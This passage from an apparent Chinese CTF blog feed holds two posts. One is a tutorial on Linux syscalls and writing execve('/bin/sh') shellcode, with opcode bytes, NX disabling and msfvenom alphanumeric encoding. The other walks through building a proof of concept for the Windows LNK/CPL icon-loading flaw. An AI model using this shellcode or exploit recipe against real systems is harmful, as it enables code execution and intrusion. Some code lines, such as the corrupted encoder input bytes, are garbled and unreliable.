sysexit)指令，64 位系统则使用 syscall（对应 sysret）指令。</strong></p><h2 id="22-调用约定"><a class="markdownIt-Anchor" href="#22-调用约定"></a> 2.2 调用约定</h2><p>调用约定是对函数调用时如何传递参数的一种约定。</p><p>（1）内核接口</p><ul><li>x86-32 系统调用约定：Linux系统调用使用寄存器传递参数。<mark>eax 存放系统调用号（syscall_number），ebx、ecx、edx、esi 和 ebp 用于将6个参数传递给系统调用</mark>。返回值保存在 eax 中。所有其它寄存器（包括 EFLAGS）都保存在 int 0x80 中。</li><li>x86-64 系统调用约定：系统调用的参数限制为 6 个，不直接从堆栈上传递任何参数。==rax 存放系统调用号（syscall_namber）。内核接口使用的寄存器有 rdi、rsi、rdx、r10、r8 和 r9。==系统调用通过 syscall 指令完成。除了 rcx、r11 和 eax，其它寄存器都被保留。返回值保存在 rax 中，只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。、</li></ul><p>（2）用户接口</p><ul><li>x86-32 函数调用约定：<mark>参数通过栈进行传递</mark>。最后一个参数第一个被放入栈中，知道所有的参数都放置完毕，然后执行 call 指令。</li><li>x86-64 函数调用约定：<mark>x86-64 下通过寄存器传递参数</mark>，这样做比栈更有效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数类型是 <mark>MEMORY</mark>，则在<mark>栈上传递参数</mark>。如果类型是 <mark>INTEGER</mark>，则==顺序使用 rdi、rsi、rdx、rcx、r8 和 r9。==如果多于 6 个参数，则后面的参数将在栈中传递。</li></ul><h3 id="22-32位程序使用-sysenter-的例子"><a class="markdownIt-Anchor" href="#22-32位程序使用-sysenter-的例子"></a> 2.2 *32位程序使用 sysenter 的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;Hello sysenter!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text </span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $len, %edx</span><br><span class="line">movl $msg, %ecx</span><br><span class="line">movl $1, %ebx</span><br><span class="line">movl $4, %eax</span><br><span class="line">#为sysenter布置栈</span><br><span class="line">pushl $sysenter_ret</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp,%ebp</span><br><span class="line">sysenter</span><br><span class="line"></span><br><span class="line">sysenter_ret:</span><br><span class="line">movl $0, %ebx</span><br><span class="line">movl $1, %eax</span><br><span class="line">#为sysenter布置栈</span><br><span class="line">pushl $sysenter_ret</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp,%ebp</span><br><span class="line">sysenter</span><br></pre></td></tr></table></figure><p>可以看到，为了使用 sysenter 指令，需要<strong>手动为其布置栈</strong>。这是因为 sysenter 返回时，会执行 _kernel_vsyscall 的后半部分（从 0xf7fd5059 开始）。_kernel_vsyscall 封装了 sysenter 调用的规范，是 vDSO 的一部分，而 vDSO 运行程序在用户层中执行代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disasseble __kernel_vsyscall</span><br><span class="line">0xf7fd5050 &lt;+0&gt;:push ecx</span><br><span class="line">0xf7fd5051 &lt;+1&gt;:push edx</span><br><span class="line">0xf7fd5052 &lt;+2&gt;:push ebp</span><br><span class="line">0xf7fd5053 &lt;+3&gt;:movebp,esp</span><br><span class="line">0xf7fd5055 &lt;+5&gt;:sysenter</span><br><span class="line">0xf7fd5057 &lt;+7&gt;:int 0x80</span><br><span class="line">--&gt;0xf7fd5059 &lt;+9&gt;:popebp</span><br><span class="line">0xf7fd505a &lt;+10&gt;:popedx</span><br><span class="line">0xf7fd505b &lt;+11&gt;:pop ecx</span><br><span class="line">0xf7fd505c &lt;+12&gt;:ret</span><br></pre></td></tr></table></figure><p>编译执行（不可编译成 64 位程序）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c sysenter32.S</span><br><span class="line">$ ld -m elf_i386 -o sysenter sysenter32.o</span><br><span class="line">$ strace ./sysenter</span><br><span class="line">execve(<span class="string">&quot;./sysenter&quot;</span>, [<span class="string">&quot;./sysenter&quot;</span>], 0x7ffe74dda6e0 /* 61 vars */) = 0</span><br><span class="line">[ Process PID=3638 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">write(1, <span class="string">&quot;Hello sysenter!\n&quot;</span>, 16Hello sysenter!</span><br><span class="line">)       = 16</span><br><span class="line"><span class="built_in">exit</span>(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h3 id="23-64位程序使用-syscall-的例子"><a class="markdownIt-Anchor" href="#23-64位程序使用-syscall-的例子"></a> 2.3 *64位程序使用 syscall 的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $1, %rdi</span><br><span class="line">movl $msg, %rsi</span><br><span class="line">movl $1, %rdx</span><br><span class="line">movl $4, %rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xorq %rdi, %rdi</span><br><span class="line">movq $60, %rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译执行（不可编译成 32 位程序）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -c hello64.S</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -o hello64 hello64.o</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">strace ./hello64</span> </span><br><span class="line">execve(&quot;./hello64&quot;, [&quot;./hello64&quot;], 0x7fffe7d694a0 /* 61 vars */) = 0</span><br><span class="line">write(1, &quot;hello 64-bit!\n&quot;, 14hello 64-bit!</span><br><span class="line">)         = 14</span><br><span class="line">exit(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h1 id="3-编写简单-shellcode"><a class="markdownIt-Anchor" href="#3-编写简单-shellcode"></a> 3. 编写简单 shellcode</h1><p>shellcode 只是一段代码，为了运行和验证，我们通常用<strong>函数指针</strong>或者<strong>内联函数</strong>的方式把它嵌入到C程序中来调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//污染所有寄存器，确保shellcode 在任何环境下都能运行</span></span><br><span class="line">    <span class="comment">/* __asm__(</span></span><br><span class="line"><span class="comment">    &quot;mov %eax, %ebx\n\t&quot;</span></span><br><span class="line"><span class="comment">&quot;mov %eax, %ecx\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %edx\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %esi\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %edi\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %ebp\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;call shellcode&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <a href="http://www.shell-storm.org/shellcode/">shell-storm</a>找一些 shellcode 学习案例，先看一个实现 execve(&quot;/bin/sh&quot;) 的 Linux 32位的程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">; int execve(const char *filename, char *const argv[], char *const envp[])</span><br><span class="line"></span><br><span class="line">xorecx, ecx; ecx = NULL</span><br><span class="line">mulecx; eax and edx = NULL</span><br><span class="line">moval, 11; execve syscall</span><br><span class="line">pushecx; string NULL</span><br><span class="line">push0x68732f2f; &quot;//sh&quot;</span><br><span class="line">push0x6e69622f; &quot;/bin&quot;</span><br><span class="line">movebx, esp; pointer to &quot;/bin/sh\0&quot; string</span><br><span class="line">int0x80; bingo</span><br></pre></td></tr></table></figure><p>首先用 NASM 对这段汇编代码进行编译，然后使用 ld 链接，运行后获得shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf32 tiny_execve_sh.asm</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_i386 tiny_execve_sh.o -o tiny_execve_sh</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d tiny_execve_sh           \                                               127 ⨯</span></span><br><span class="line"></span><br><span class="line">tiny_execve_sh：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line">08049000 &lt;_start&gt;:</span><br><span class="line"> 8049000:       31 c9                   xor    %ecx,%ecx</span><br><span class="line"> 8049002:       f7 e1                   mul    %ecx</span><br><span class="line"> 8049004:       b0 0b                   mov    $0xb,%al</span><br><span class="line"> 8049006:       51                      push   %ecx</span><br><span class="line"> 8049007:       68 2f 2f 73 68          push   $0x68732f2f</span><br><span class="line"> 804900c:       68 2f 62 69 6e          push   $0x6e69622f</span><br><span class="line"> 8049011:       89 e3                   mov    %esp,%ebx</span><br><span class="line"> 8049013:       cd 80                   int    $0x80</span><br></pre></td></tr></table></figure><p>为了在 C 程序中使用这段 shellcode，我们需将其 <mark>opcode 提取</mark>出来（我这里 cut:无效的字段范围）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d ./tiny_execve_sh|grep <span class="string">&#x27;[0-9a-f]:&#x27;</span>|grep -v <span class="string">&#x27;file&#x27;</span>|<span class="built_in">cut</span> -f2 -d:|<span class="built_in">cut</span> -f1-6 -d<span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span>|sed <span class="string">&#x27;s/ $//g&#x27;</span>|sed <span class="string">&#x27;s/ /\\x/g&#x27;</span>|<span class="built_in">paste</span> -d <span class="string">&#x27;&#x27;</span> -s |sed <span class="string">&#x27;s/^/&quot;/&#x27;</span>|sed <span class="string">&#x27;s/$/&quot;/g&#x27;</span></span></span><br><span class="line">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br></pre></td></tr></table></figure><p>将提取出来的字符放到 C 程序的 shellcode[] 中。需要注意的是，shellcode 作为全局初始化变量，存放在 .data 段中，而编译时默认开启的 NX 保护机制，会将数据所在的内存页标识为不可执行，当程序转入 shellcode 执行时抛出异常。因此，下面需要关闭 NX。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -m32 -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh_shellcode</span></span><br></pre></td></tr></table></figure><p>Linux 64 位的 shellcode 也一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">;&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 tiny_execve_sh64.asm</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 tiny_execve_sh64.o -o tiny_execve_sh64</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh64</span> </span><br></pre></td></tr></table></figure><h1 id="4-shellcode-变形"><a class="markdownIt-Anchor" href="#4-shellcode-变形"></a> 4. shellcode 变形</h1><p>有时，被注入进程的 shellcode 会被限制使用某些字符，例如不能有 NULL、只能用字母和数字等可见字符、ASCII 和 Unicode 编码转换等，因此需要进行一些处理。</p><p>由于 NULL 会将字符串操作函数截断，所以我们需要用其它相似功能的指令来替代，下面是一个 32 位指令替换的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">替换前：</span><br><span class="line">B8 01000000 MOVEAX,1</span><br><span class="line"></span><br><span class="line">替换后：</span><br><span class="line">33C0XOR EAX,EAX</span><br><span class="line">40INC EAX</span><br></pre></td></tr></table></figure><p>对于只能使用可见字符字母（也就是只能用字母和数字组合）的情况，将 shellcode 的字符进行编码，使其符合限制条件。相应地，需要在 shellcode 中加入解码器，在代码行前将原始 shellcode 还原出来。</p><p>著名的渗透测试框架 Metasploit 中就集成了许多 shellcode 的编码器，这里我们选择 x86/alpha_mixed 来编码 32 位的 shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">msfvenom -1 encoders | grep -i alphanumeric</span></span><br><span class="line">x86/alpha_mixed lowAlpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">x86/alpha_upperlowAlpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">x86/unicode_mixedmanual Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">x86/unicode uDpermanual Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">python -c <span class="string">&#x27;import sys; sys.stdout.write(&quot;\x31\xc9\xf7\xel\xb0\x0b\x51\</span></span></span><br><span class="line"><span class="string"><span class="language-bash">x68\:&lt;2f\x2f\xT?3\x68\x68\x2f\x62\x69\x6e\x89\xo3\xcd\x80&quot;)&#x27;</span> | msfveno -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufterRegister=EAX</span> </span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_mixed </span><br><span class="line">x86/alpha_mixed succeeded with size 96 (iteration=0)</span><br><span class="line">x86/alpha mixed chosen with final size 96</span><br><span class="line">Payload size: 96 bytes</span><br><span class="line">PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01o9igHah04Ksa3XTodot31</span><br><span class="line">xBHtorBcYpnniis8MOpAA</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://www.cnblogs.com/lsgxeva/p/10794331.html">Linux下shellcode的编写</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/212610634">带你玩转 Linux Shellcode</a></p><p>​<a href="https://www.freebuf.com/articles/system/237300.html">简述获取shellcode的几种方式</a></p><p>​<a href="https://cloud.tencent.com/developer/article/1930058?from=article.detail.1799682">Linux下Shellcode编写</a></p><p>​<a href="https://filippo.io/linux-syscall-table/">Linux Syscall Table</a></p><p>​《CTF竞赛权威指南》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-什么是-shellcode&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是-shellcode&quot;&gt;&lt;/a&gt; 1. 什么是 shellcode ？&lt;/h1&gt;
&lt;p&gt;shellcode 通常用机器语言</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="shellcode" scheme="https://www.rgzzplus.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>LNK快捷方式文件漏洞</title>
    <link href="https://www.rgzzplus.com/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.rgzzplus.com/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-08-01T10:26:50.000Z</published>
    <updated>2022-08-01T10:28:00.356Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="漏洞简介"><a class="markdownIt-Anchor" href="#漏洞简介"></a> 漏洞简介</h1><p>LNK 快捷方式文件漏洞，又叫 CPL Icon 加载漏洞。用户只要浏览一下 LNK 文件所在的目录病毒就能执行。</p><h1 id="漏洞原理及利用分析"><a class="markdownIt-Anchor" href="#漏洞原理及利用分析"></a> 漏洞原理及利用分析</h1><p>既然是快捷方式漏洞，那我们就先了解以下快捷方式文件的格式。</p><h2 id="快捷方式文件的格式"><a class="markdownIt-Anchor" href="#快捷方式文件的格式"></a> 快捷方式文件的格式</h2><p>快捷方式文件的结构是分段式的。</p><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220721221346481.png" alt="image-20220721221346481" style="zoom:50%;"><p>触发漏洞的数据保存在 Shell Item Id List 段中，所以我们只介绍该段的数据结构。</p><p>Shell Item Id List 段为可选段，一个快捷方式文件中是否存在 Shell Item Id List 段是由文件头中偏移 0x14 位置处的值来决定，0bit 值为 1 时，表示该 lnk 文件包含该结构。同时如果存在该结构，偏移 0x4c 的位置的会存在一个 unsigned short int 型的变量，用来标识 Shell Item Id List 结构的大小，紧随其后的为一系列的 SHITEMID 结构，该结构体定义如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SHITEMID</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> cb;<span class="comment">//cb标识一项SHITEMID结构大小</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> abID[<span class="number">0</span>];<span class="comment">//abID是可变结构，</span></span><br><span class="line">    <span class="comment">//存储具体数据，但第0项里面的</span></span><br><span class="line">    <span class="comment">//数据是不能修改的，</span></span><br><span class="line">    <span class="comment">//否则.lnk文件无法运行。</span></span><br><span class="line">&#125;SHITEMID,*LPSHITEMID;</span><br></pre></td></tr></table></figure><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220721222609971.png" alt="image-20220721222609971" style="zoom: 33%;"><p>漏洞触发的原理：SHELL32.DLL 在根据 Shell Item Id 加载快捷方式图标的时候未对被加载的项目（DLL 或者 CPL）进行有效性校验，造成了攻击者可能通过构造特殊的 Shell Item Id 来加载恶意的 DLL。</p><h2 id="漏洞文件生成"><a class="markdownIt-Anchor" href="#漏洞文件生成"></a> 漏洞文件生成</h2><p>实验环境：windows 2000 sp4</p><p>由于触发这个漏洞需要 CPL 加载机制，所以并不是所有的快捷方式文件都可以触发这个漏洞，只有指向控制面板下面功能的快捷方式才能够出发这个漏洞。</p><ol><li>建立基础 LNK 文件：<br>大家可以通过右键单击控制面板下面的图片，然后选择“创建快捷方式”选项来<strong>建立基础 LNK 文件</strong>。在这我们以“鼠标”为例。</li></ol><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731143316381.png" alt="image-20220731143316381" style="zoom: 50%;"><ol start="2"><li>将建立好符合要求的基础 LNK 文件<strong>改造成能够触发漏洞的 POC 文件</strong>：<br>（1）用WinHex打开鼠标.LNK文件，将偏移 0x7A 到 0x7D 的 0x9CFFFFFF 修改为 0x00000000。需要注意的是，如果您在建立基础 LNK 文件时不是使用的“鼠标”项目， 0x7A 到 0x7D 的值可能不是 0x9CFFFFFF。</li></ol><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220726105411454.png" alt="image-20220726105411454" style="zoom: 67%;"><p>​（2）在偏移 0x8E 位置处写入我们要加载的 DLL 地址，在这我们使用 C:\DLL.DLL，其效果是弹出一个“test”对话框，当然您也可以选择使用其他的 DLL 来进行调试。</p><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731143558861.png" alt="image-20220731143558861" style="zoom:50%;"><h2 id="漏洞产生原理"><a class="markdownIt-Anchor" href="#漏洞产生原理"></a> 漏洞产生原理</h2><p>这个 POC 的最终目的是加载一个 DLL 文件，所以我们可以先在 LoadLibraryW 函数上设置断点，然后再通过回溯函数调用过程的方式找到上层函数，最终找到出问题的函数。</p><p>首先，我们先用下面的源码 再vc6.0中编写一个能弹出对话框的 DLL 文件，然后把这个文件重命名为 DLL.DLL 并放到 C 盘下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DLL.dll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HANDLE hModule, </span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call, </span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params"> )</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>,<span class="string">&quot;Hello World&quot;</span>,<span class="string">&quot;Test&quot;</span>,MB_OK);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再用 OllyDbg 附加到 explorer.exe 的进程上，对 LoadLibraryW 函数设置断点，接下来浏览以下保存我们修改的 LNK 文件的目录。此时，可能会出现两种情况。</p><ol><li>OllyDbg 中断触发。如果是这样我们就能在 view --&gt;Call stack 菜单中查看当前函数调用情况。</li><li>OllyDbg 中断未触发，这是因为您已经浏览过这个目录。由于快捷方式图标的加载具有缓存机制，如果以前已经加载过，现在他就不会再重复加载。此时您可以将 LNK 文件重命名，之后 OllyDbg 中的断点就可以触发了。</li></ol><p><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731154330734.png" alt="image-20220731154330734"></p><p>中断后，我们能在栈中看到本次 LoadLibraryW 函数调用的 FileName 参数为 “C:\DLL.DLL”，说明我们找对地方了，并且我这里也直接出现了弹出框。如果没有看到这个参数，那就多按几次 F9。</p><p>接下来我们通过 Call stack 查看函数调用情况。<br><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731154949928.png" alt="image-20220731154949928"></p><p>shell32在处理lnk文件的时候要把它的图标显示出来，对于一般文件应该是从Icon filename string里面解析，但对于文件后面没有Icon filename string结构的控制面板快捷方式，是直接从0x7A那里的iconindex来解析。当这个iconindex是0的时候，会去加载cpl文件，调用CPlApplet接口，这样就存在执行DLL中代码的问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 